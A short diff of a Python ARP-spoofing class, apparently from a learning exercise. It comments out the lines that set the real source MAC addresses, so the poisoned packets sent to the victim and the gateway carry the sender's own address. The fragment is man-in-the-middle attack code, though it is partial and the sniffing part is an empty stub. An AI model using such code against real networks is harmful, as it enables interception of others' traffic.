@@ -42,7 +42,7 @@ class Arper:
         poison_victim.psrc = self.gateway
         poison_victim.pdst = self.victim
         poison_victim.hwdst = self.victim_mac
-        poison_victim.hwsrc = self.gateway_mac
+        #poison_victim.hwsrc = self.gateway_mac
         print(f'ip de origem: {poison_victim.psrc}')
         print(f'ip de destino: {poison_victim.pdst}')
         print(f'mac de destino: {poison_victim.hwdst}')
@@ -55,7 +55,7 @@ class Arper:
         poison_gateway.psrc = self.victim
         poison_gateway.pdst = self.gateway
         poison_gateway.hwdst = self.gateway_mac
-        poison_gateway.hwsrc = self.victim_mac
+        #poison_gateway.hwsrc = self.victim_mac
         print(f'ip de origem: {poison_gateway.psrc}')
         print(f'ip de destino: {poison_gateway.pdst}')
         print(f'mac de destino: {poison_gateway.hwdst}')
@@ -76,7 +76,7 @@ class Arper:
                 sys.exit()
             else:
                 time.sleep(2)
-                
+
     def sniff(self, count = 200):
         pass
 
